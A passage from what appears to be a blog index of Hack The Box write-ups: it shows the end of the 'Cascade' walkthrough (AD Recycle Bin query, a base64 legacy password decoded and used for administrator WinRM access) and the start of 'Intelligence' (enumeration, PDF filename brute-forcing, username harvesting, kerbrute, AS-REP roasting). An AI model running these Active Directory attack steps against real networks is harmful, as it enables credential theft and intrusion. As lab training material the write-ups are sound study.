[*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local) HTTP 10.10.10.182 5985 CASC-DC1 [*] http://10.10.10.182:5985/wsman WINRM 10.10.10.182 5985 CASC-DC1 [+] cascade.local\\arksvc:w3lc0meFr31nd (Pwn3d!) Root whoami *Evil-WinRM* PS C:\\Users\\arksvc\\Documents\u0026gt; whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled *Evil-WinRM* PS C:\\Users\\arksvc\\Documents\u0026gt; whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes =========================================== ================ ============================================== =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group CASCADE\\Data Share Alias S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\\IT Alias S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\\AD Recycle Bin Alias S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\\Remote Management Users Alias S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Plus Mandatory Level Label S-1-16-8448 AD Recycle Bin - enables users to recover deleted Active Directory objects without having to restore them from backup, restart Active Directory Domain Services or reboot domain controllers (DCs) The post https://hideandsec.sh/books/red-teaming/page/domain-control-elevation#bkmrk-0x10-ad-recycle-bin Also https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#a-d-recycle-bin We can query it *Evil-WinRM* PS C:\\Users\\arksvc\\Documents\u0026gt; Get-ADObject -filter \u0026#39;isDeleted -eq $true -and name -ne \u0026#34;Deleted Objects\u0026#34;\u0026#39; -includeDeletedObjects Deleted : True DistinguishedName : CN=CASC-WS1\\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local Name : CASC-WS1 DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe ObjectClass : computer ObjectGUID : 6d97daa4-2e82-4946-a11e-f91fa18bfabe Deleted : True DistinguishedName : CN=Scheduled Tasks\\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local Name : Scheduled Tasks DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2 ObjectClass : group ObjectGUID : 13375728-5ddb-4137-b8b8-b9041d1d3fd2 Deleted : True DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local Name : {A403B701-A528-4685-A816-FDEE32BDDCBA} DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e ObjectClass : groupPolicyContainer ObjectGUID : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e Deleted : True DistinguishedName : CN=Machine\\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local Name : Machine DEL:93c23674-e411-400b-bb9f-c0340bda5a34 ObjectClass : container ObjectGUID : 93c23674-e411-400b-bb9f-c0340bda5a34 Deleted : True DistinguishedName : CN=User\\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local Name : User DEL:746385f2-e3a0-4252-b83a-5a206da0ed88 ObjectClass : container ObjectGUID : 746385f2-e3a0-4252-b83a-5a206da0ed88 Deleted : True DistinguishedName : CN=TempAdmin\\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local Name : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 ObjectClass : user ObjectGUID : f0cc344d-31e0-4866-bceb-a842791ca059 TempAdmin is interesting since we saw it in the email message It should have the same password as Administrator *Evil-WinRM* PS C:\\Users\\arksvc\\Documents\u0026gt; Get-ADObject -filter { SAMAccountName -eq \u0026#34;TempAdmin\u0026#34; } -includeDeletedObjects -property * accountExpires : 9223372036854775807 badPasswordTime : 0 badPwdCount : 0 CanonicalName : cascade.local/Deleted Objects/TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz CN : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 codePage : 0 countryCode : 0 Created : 1/27/2020 3:23:08 AM createTimeStamp : 1/27/2020 3:23:08 AM Deleted : True Description : DisplayName : TempAdmin DistinguishedName : CN=TempAdmin\\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM} givenName : TempAdmin instanceType : 4 isDeleted : True LastKnownParent : OU=Users,OU=UK,DC=cascade,DC=local lastLogoff : 0 lastLogon : 0 logonCount : 0 Modified : 1/27/2020 3:24:34 AM modifyTimeStamp : 1/27/2020 3:24:34 AM msDS-LastKnownRDN : TempAdmin Name : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 nTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurity ObjectCategory : ObjectClass : user ObjectGUID : f0cc344d-31e0-4866-bceb-a842791ca059 objectSid : S-1-5-21-3332504370-1206983947-1165150453-1136 primaryGroupID : 513 ProtectedFromAccidentalDeletion : False pwdLastSet : 132245689883479503 sAMAccountName : TempAdmin sDRightsEffective : 0 userAccountControl : 66048 userPrincipalName : TempAdmin@cascade.local uSNChanged : 237705 uSNCreated : 237695 whenChanged : 1/27/2020 3:24:34 AM whenCreated : 1/27/2020 3:23:08 AM The property cascadeLegacyPwd has a value Let\u0026rsquo;s decrypt it └─$ echo \u0026#34;YmFDVDNyMWFOMDBkbGVz\u0026#34; | base64 -d baCT3r1aN00dles The password works for Administrator └─$ crackmapexec winrm 10.10.10.182 -u administrator -p baCT3r1aN00dles SMB 10.10.10.182 5985 CASC-DC1 [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local) HTTP 10.10.10.182 5985 CASC-DC1 [*] http://10.10.10.182:5985/wsman WINRM 10.10.10.182 5985 CASC-DC1 [+] cascade.local\\administrator:baCT3r1aN00dles (Pwn3d!) ","date":"September 6, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/cascade/images/cascade.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/cascade/","summary":"Cascade Enumeration nmap └─$ nmap -Pn -p- 10.10.10.182 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-05 20:29 BST Stats: 0:03:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 43.53% done; ETC: 20:36 (0:03:56 remaining) Nmap scan report for 10.10.10.182 (10.10.10.182) Host is up (0.093s latency). Not shown: 65525 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 49154/tcp open unknown 49155/tcp open unknown 49157/tcp open unknown 49170/tcp open unknown └─$ nmap -Pn -p53,88,135,389,445,636,3268,3269,5985 -sC -sV 10.","tags":["HTB","rpc","ldap","ldapsearch","smb","tightvnc","msfconsole","evil-winrm","crackmapexec","sqlite","dnspy","debug","ad-recycle"],"title":"[HTB] Machine: Cascade"},{"categories":null,"contents":"Intelligence Enumeration nmap └─$ nmap -Pn -p- 10.10.10.248 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-06 17:07 BST Nmap scan report for 10.10.10.248 (10.10.10.248) Host is up (0.095s latency). Not shown: 65518 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 5985/tcp open wsman 9389/tcp open adws 49667/tcp open unknown 49691/tcp open unknown 49692/tcp open unknown 49708/tcp open unknown 49714/tcp open unknown └─$ nmap -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,9389 -sC -sV 10.10.10.248 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-06 17:11 BST Nmap scan report for 10.10.10.248 (10.10.10.248) Host is up (0.17s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Intelligence 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-06 23:10:33Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-09-06T23:11:56+00:00; +6h59m24s from scanner time. | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-09-06T23:11:57+00:00; +6h59m24s from scanner time. | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2023-09-06T23:11:56+00:00; +6h59m24s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-09-06T23:11:56+00:00; +6h59m24s from scanner time. | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 9389/tcp open mc-nmf .NET Message Framing Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-09-06T23:11:17 |_ start_date: N/A |_clock-skew: mean: 6h59m23s, deviation: 0s, median: 6h59m23s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 91.24 seconds └─$ sudo nmap -sU --top-ports 10 -sV -sC 10.10.10.248 [sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-06 17:23 BST Nmap scan report for 10.10.10.248 (10.10.10.248) Host is up (0.10s latency). PORT STATE SERVICE VERSION 53/udp open domain Simple DNS Plus 67/udp open|filtered dhcps 123/udp open ntp NTP v3 | ntp-info: |_ 135/udp open|filtered msrpc 137/udp open|filtered netbios-ns 138/udp open|filtered netbios-dgm 161/udp open|filtered snmp 445/udp open|filtered microsoft-ds 631/udp open|filtered ipp 1434/udp open|filtered ms-sql-m Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 6h59m24s smb └─$ smbclient -N -L //10.10.10.248 Anonymous login successful Sharename Type Comment --------- ---- ------- Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.10.248 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available dns └─$ dig @dc.intelligence.htb intelligence.htb ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.16-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; @dc.intelligence.htb intelligence.htb ; (1 server found) ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 1581 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4000 ;; QUESTION SECTION: ;intelligence.htb. IN A ;; ANSWER SECTION: intelligence.htb. 600 IN A 10.10.10.248 ;; Query time: 95 msec ;; SERVER: 10.10.10.248#53(dc.intelligence.htb) (UDP) ;; WHEN: Wed Sep 06 17:29:23 BST 2023 ;; MSG SIZE rcvd: 61 └─$ dig axfr @dc.intelligence.htb intelligence.htb ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.16-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr @dc.intelligence.htb intelligence.htb ; (1 server found) ;; global options: +cmd ; Transfer failed. └─$ dnsenum --dnsserver 10.10.10.248 -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt intelligence.htb dnsenum VERSION:1.2.6 ----- intelligence.htb ----- Host\u0026#39;s addresses: __________________ intelligence.htb. 600 IN A 10.10.10.248 Name Servers: ______________ dc.intelligence.htb. 3600 IN A 10.10.10.248 Mail (MX) Servers: ___________________ Trying Zone Transfers and getting Bind Versions: _________________________________________________ unresolvable name: dc.intelligence.htb at /usr/bin/dnsenum line 900. Trying Zone Transfer for intelligence.htb on dc.intelligence.htb ... AXFR record query failed: no nameservers Brute forcing with /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt: ________________________________________________________________________________________ dc.intelligence.htb. 3600 IN A 10.10.10.248 domaindnszones.intelligence.htb. 600 IN A 10.10.10.248 forestdnszones.intelligence.htb. 600 IN A 10.10.10.248 intelligence.htb class C netranges: ____________________________________ Performing reverse lookup on 0 ip addresses: _____________________________________________ 0 results out of 0 IP addresses. intelligence.htb ip blocks: ____________________________ done. ldap └─$ ldapsearch -H ldap://10.10.10.248 -x -s base namingcontexts # extended LDIF # # LDAPv3 # base \u0026lt;\u0026gt; (default) with scope baseObject # filter: (objectclass=*) # requesting: namingcontexts # # dn: namingcontexts: DC=intelligence,DC=htb namingcontexts: CN=Configuration,DC=intelligence,DC=htb namingcontexts: CN=Schema,CN=Configuration,DC=intelligence,DC=htb namingcontexts: DC=DomainDnsZones,DC=intelligence,DC=htb namingcontexts: DC=ForestDnsZones,DC=intelligence,DC=htb # search result search: 2 result: 0 Success # numResponses: 2 # numEntries: 1 └─$ ldapsearch -H ldap://10.10.10.248 -x -b \u0026#34;DC=intelligence,DC=htb\u0026#34; # extended LDIF # # LDAPv3 # base \u0026lt;DC=intelligence,DC=htb\u0026gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # search result search: 2 result: 1 Operations error text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera tion a successful bind must be completed on the connection., data 0, v4563 # numResponses: 1 Web Server contact@intelligence.htb http://intelligence.htb/documents/2020-01-01-upload.pdf http://intelligence.htb/documents/2020-12-15-upload.pdf gobuster └─$ gobuster dir -u http://intelligence.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,asp,aspx --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://intelligence.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,asp,aspx [+] Timeout: 10s =============================================================== 2023/09/06 17:57:47 Starting gobuster in directory enumeration mode =============================================================== /documents (Status: 301) [Size: 157] [--\u0026gt; http://intelligence.htb/documents/] Check pdf files └─$ exiftool 2020-12-15-upload.pdf ExifTool Version Number : 12.64 File Name : 2020-12-15-upload.pdf Directory : . File Size : 27 kB File Modification Date/Time : 2023:09:06 17:59:11+01:00 File Access Date/Time : 2023:09:06 17:59:11+01:00 File Inode Change Date/Time : 2023:09:06 17:59:11+01:00 File Permissions : -rw-r--r-- File Type : PDF File Type Extension : pdf MIME Type : application/pdf PDF Version : 1.5 Linearized : No Page Count : 1 Creator : Jose.Williams └─$ exiftool 2020-01-01-upload.pdf ExifTool Version Number : 12.64 File Name : 2020-01-01-upload.pdf Directory : . File Size : 27 kB File Modification Date/Time : 2023:09:06 17:59:07+01:00 File Access Date/Time : 2023:09:06 17:59:07+01:00 File Inode Change Date/Time : 2023:09:06 17:59:07+01:00 File Permissions : -rw-r--r-- File Type : PDF File Type Extension : pdf MIME Type : application/pdf PDF Version : 1.5 Linearized : No Page Count : 1 Creator : William.Lee Foothold We have 2 possible users Let\u0026rsquo;s test them with kerbrute └─$ kerbrute userenum --dc dc.intelligence.htb -d intelligence.htb users.list __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - 09/06/23 - Ronnie Flathers @ropnop 2023/09/06 18:02:35 \u0026gt; Using KDC(s): 2023/09/06 18:02:35 \u0026gt; dc.intelligence.htb:88 2023/09/06 18:02:36 \u0026gt; [+] VALID USERNAME: William.Lee@intelligence.htb 2023/09/06 18:02:36 \u0026gt; [+] VALID USERNAME: Jose.Williams@intelligence.htb 2023/09/06 18:02:36 \u0026gt; Done! Tested 2 usernames (2 valid) in 0.137 seconds Let\u0026rsquo;s check for AS-REP-roasting └─$ impacket-GetNPUsers -no-pass -dc-ip dc.intelligence.htb intelligence.htb/William.Lee Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Getting TGT for William.Lee [-] User William.Lee doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set └─$ impacket-GetNPUsers -no-pass -dc-ip dc.intelligence.htb intelligence.htb/Jose.Williams Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Getting TGT for Jose.Williams [-] User Jose.Williams doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set I was stuck here for a while, so got a hint fuzz for pdf documents So we probably need to fuzz, download and go through pdfs └─$ for year in 2020 2021; do (for month in `cat months.list`; do ( for day in `cat days.list`; do (wget http://intelligence.htb/documents/$year-$month-$day-upload.pdf 2\u0026gt;/dev/null); done; ); done;); done; 2020-01-01-upload.pdf 2020-02-23-upload.pdf 2020-04-15-upload.pdf 2020-06-02-upload.pdf 2020-06-26-upload.pdf 2020-08-19-upload.pdf 2020-09-29-upload.pdf 2020-11-30-upload.pdf 2021-02-10-upload.pdf 2020-01-02-upload.pdf 2020-02-24-upload.pdf 2020-04-23-upload.pdf 2020-06-03-upload.pdf 2020-06-28-upload.pdf 2020-08-20-upload.pdf 2020-09-30-upload.pdf 2020-12-10-upload.pdf 2021-02-13-upload.pdf 2020-01-04-upload.pdf 2020-02-28-upload.pdf 2020-05-01-upload.pdf 2020-06-04-upload.pdf 2020-06-30-upload.pdf 2020-09-02-upload.pdf 2020-10-05-upload.pdf 2020-12-15-upload.pdf 2021-02-21-upload.pdf 2020-01-10-upload.pdf 2020-03-04-upload.pdf 2020-05-03-upload.pdf 2020-06-07-upload.pdf 2020-07-02-upload.pdf 2020-09-04-upload.pdf 2020-10-19-upload.pdf 2020-12-20-upload.pdf 2021-02-25-upload.pdf 2020-01-20-upload.pdf 2020-03-05-upload.pdf 2020-05-07-upload.pdf 2020-06-08-upload.pdf 2020-07-06-upload.pdf 2020-09-05-upload.pdf 2020-11-01-upload.pdf 2020-12-24-upload.pdf 2021-03-01-upload.pdf 2020-01-22-upload.pdf 2020-03-12-upload.pdf 2020-05-11-upload.pdf 2020-06-12-upload.pdf 2020-07-08-upload.pdf 2020-09-06-upload.pdf 2020-11-03-upload.pdf 2020-12-28-upload.pdf 2021-03-07-upload.pdf 2020-01-23-upload.pdf 2020-03-13-upload.pdf 2020-05-17-upload.pdf 2020-06-14-upload.pdf 2020-07-20-upload.pdf 2020-09-11-upload.pdf 2020-11-06-upload.pdf 2020-12-30-upload.pdf 2021-03-10-upload.pdf 2020-01-25-upload.pdf 2020-03-17-upload.pdf 2020-05-20-upload.pdf 2020-06-15-upload.pdf 2020-07-24-upload.pdf 2020-09-13-upload.pdf 2020-11-10-upload.pdf 2021-01-03-upload.pdf 2021-03-18-upload.pdf 2020-01-30-upload.pdf 2020-03-21-upload.pdf 2020-05-21-upload.pdf 2020-06-21-upload.pdf 2020-08-01-upload.pdf 2020-09-16-upload.pdf 2020-11-11-upload.pdf 2021-01-14-upload.pdf 2021-03-21-upload.pdf 2020-02-11-upload.pdf 2020-04-02-upload.pdf 2020-05-24-upload.pdf 2020-06-22-upload.pdf 2020-08-03-upload.pdf 2020-09-22-upload.pdf 2020-11-13-upload.pdf 2021-01-25-upload.pdf 2021-03-25-upload.pdf 2020-02-17-upload.pdf 2020-04-04-upload.pdf 2020-05-29-upload.pdf 2020-06-25-upload.pdf 2020-08-09-upload.pdf 2020-09-27-upload.pdf 2020-11-24-upload.pdf 2021-01-30-upload.pdf 2021-03-27-upload.pdf Now we need go through them Let\u0026rsquo;s get all Creators └─$ exiftool *pdf | grep Creator | cut -d\u0026#39;:\u0026#39; -f2 | sort | uniq Anita.Roberts Brian.Baker Brian.Morris Daniel.Shelton Danny.Matthews Darryl.Harris David.Mcbride David.Reed David.Wilson Ian.Duncan Jason.Patterson Jason.Wright Jennifer.Thomas Jessica.Moody John.Coleman Jose.Williams Kaitlyn.Zimmerman Kelly.Long Nicole.Brock Richard.Williams Samuel.Richardson Scott.Scott Stephanie.Young Teresa.Williamson Thomas.Hall Thomas.Valenzuela Tiffany.Molina Travis.Evans Veronica.Patel William.Lee Now we can use pdftotext to convert pdf to text └─$ for file in `ls *.pdf`; do (pdftotext $file); done 2020-01-01-upload.pdf 2020-02-17-upload.txt 2020-04-04-upload.pdf 2020-05-24-upload.txt 2020-06-22-upload.pdf 2020-08-01-upload.txt 2020-09-16-upload.pdf 2020-11-10-upload.txt 2021-01-03-upload.pdf 2021-03-10-upload.txt 2020-01-01-upload.txt 2020-02-23-upload.pdf 2020-04-04-upload.txt 2020-05-29-upload.pdf 2020-06-22-upload.txt 2020-08-03-upload.pdf 2020-09-16-upload.txt 2020-11-11-upload.pdf 2021-01-03-upload.txt 2021-03-18-upload.pdf 2020-01-02-upload.pdf 2020-02-23-upload.txt 2020-04-15-upload.pdf 2020-05-29-upload.txt 2020-06-25-upload.pdf 2020-08-03-upload.txt 2020-09-22-upload.pdf 2020-11-11-upload.txt 2021-01-14-upload.pdf 2021-03-18-upload.txt 2020-01-02-upload.txt 2020-02-24-upload.pdf 2020-04-15-upload.txt 2020-06-02-upload.pdf 2020-06-25-upload.txt 2020-08-09-upload.pdf 2020-09-22-upload.txt 2020-11-13-upload.pdf 2021-01-14-upload.txt 2021-03-21-upload.pdf 2020-01-04-upload.pdf 2020-02-24-upload.txt 2020-04-23-upload.pdf 2020-06-02-upload.txt 2020-06-26-upload.pdf 2020-08-09-upload.txt 2020-09-27-upload.pdf 2020-11-13-upload.txt 2021-01-25-upload.pdf 2021-03-21-upload.txt 2020-01-04-upload.txt 2020-02-28-upload.pdf 2020-04-23-upload.txt 2020-06-03-upload.pdf 2020-06-26-upload.txt 2020-08-19-upload.pdf 2020-09-27-upload.txt 2020-11-24-upload.pdf 2021-01-25-upload.txt 2021-03-25-upload.pdf 2020-01-10-upload.pdf 2020-02-28-upload.txt 2020-05-01-upload.pdf 2020-06-03-upload.txt 2020-06-28-upload.pdf 2020-08-19-upload.txt 2020-09-29-upload.pdf 2020-11-24-upload.txt 2021-01-30-upload.pdf 2021-03-25-upload.txt 2020-01-10-upload.txt 2020-03-04-upload.pdf 2020-05-01-upload.txt 2020-06-04-upload.pdf 2020-06-28-upload.txt 2020-08-20-upload.pdf 2020-09-29-upload.txt 2020-11-30-upload.pdf 2021-01-30-upload.txt 2021-03-27-upload.pdf 2020-01-20-upload.pdf 2020-03-04-upload.txt 2020-05-03-upload.pdf 2020-06-04-upload.txt 2020-06-30-upload.pdf 2020-08-20-upload.txt 2020-09-30-upload.pdf 2020-11-30-upload.txt 2021-02-10-upload.pdf 2021-03-27-upload.txt 2020-01-20-upload.txt 2020-03-05-upload.pdf 2020-05-03-upload.txt 2020-06-07-upload.pdf 2020-06-30-upload.txt 2020-09-02-upload.pdf 2020-09-30-upload.txt 2020-12-10-upload.pdf 2021-02-10-upload.txt 2020-01-22-upload.pdf 2020-03-05-upload.txt 2020-05-07-upload.pdf 2020-06-07-upload.txt 2020-07-02-upload.pdf 2020-09-02-upload.txt 2020-10-05-upload.pdf 2020-12-10-upload.txt 2021-02-13-upload.pdf 2020-01-22-upload.txt 2020-03-12-upload.pdf 2020-05-07-upload.txt 2020-06-08-upload.pdf 2020-07-02-upload.txt 2020-09-04-upload.pdf 2020-10-05-upload.txt 2020-12-15-upload.pdf 2021-02-13-upload.txt 2020-01-23-upload.pdf 2020-03-12-upload.txt 2020-05-11-upload.pdf 2020-06-08-upload.txt 2020-07-06-upload.pdf 2020-09-04-upload.txt 2020-10-19-upload.pdf 2020-12-15-upload.txt 2021-02-21-upload.pdf 2020-01-23-upload.txt 2020-03-13-upload.pdf 2020-05-11-upload.txt 2020-06-12-upload.pdf 2020-07-06-upload.txt 2020-09-05-upload.pdf 2020-10-19-upload.txt 2020-12-20-upload.pdf 2021-02-21-upload.txt 2020-01-25-upload.pdf 2020-03-13-upload.txt 2020-05-17-upload.pdf 2020-06-12-upload.txt 2020-07-08-upload.pdf 2020-09-05-upload.txt 2020-11-01-upload.pdf 2020-12-20-upload.txt 2021-02-25-upload.pdf 2020-01-25-upload.txt 2020-03-17-upload.pdf 2020-05-17-upload.txt 2020-06-14-upload.pdf 2020-07-08-upload.txt 2020-09-06-upload.pdf 2020-11-01-upload.txt 2020-12-24-upload.pdf 2021-02-25-upload.txt 2020-01-30-upload.pdf 2020-03-17-upload.txt 2020-05-20-upload.pdf 2020-06-14-upload.txt 2020-07-20-upload.pdf 2020-09-06-upload.txt 2020-11-03-upload.pdf 2020-12-24-upload.txt 2021-03-01-upload.pdf 2020-01-30-upload.txt 2020-03-21-upload.pdf 2020-05-20-upload.txt 2020-06-15-upload.pdf 2020-07-20-upload.txt 2020-09-11-upload.pdf 2020-11-03-upload.txt 2020-12-28-upload.pdf 2021-03-01-upload.txt 2020-02-11-upload.pdf 2020-03-21-upload.txt 2020-05-21-upload.pdf 2020-06-15-upload.txt 2020-07-24-upload.pdf 2020-09-11-upload.txt 2020-11-06-upload.pdf 2020-12-28-upload.txt 2021-03-07-upload.pdf 2020-02-11-upload.txt 2020-04-02-upload.pdf 2020-05-21-upload.txt 2020-06-21-upload.pdf 2020-07-24-upload.txt 2020-09-13-upload.pdf 2020-11-06-upload.txt 2020-12-30-upload.pdf 2021-03-07-upload.txt 2020-02-17-upload.pdf 2020-04-02-upload.txt 2020-05-24-upload.pdf 2020-06-21-upload.txt 2020-08-01-upload.pdf 2020-09-13-upload.txt 2020-11-10-upload.pdf 2020-12-30-upload.txt 2021-03-10-upload.pdf We also have to check if found users are valid └─$ ~/Documents/Tools/kerbrute userenum --dc dc.intelligence.htb -d intelligence.htb users.list __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - 09/06/23 - Ronnie Flathers @ropnop 2023/09/06 18:52:22 \u0026gt; Using KDC(s): 2023/09/06 18:52:22 \u0026gt; dc.intelligence.htb:88 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: Brian.Morris@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: David.Mcbride@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: Darryl.Harris@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: Danny.Matthews@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: Daniel.Shelton@intelligence.htb 